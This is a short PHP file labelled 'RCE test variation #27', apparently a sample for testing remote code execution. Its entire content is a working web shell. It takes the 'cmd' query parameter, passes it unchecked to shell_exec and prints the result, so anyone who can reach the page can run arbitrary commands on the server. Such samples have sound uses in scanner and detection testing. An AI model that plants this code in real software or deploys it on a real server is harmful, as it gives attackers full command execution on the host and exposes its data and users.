<?php
// RCE test variation #27
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>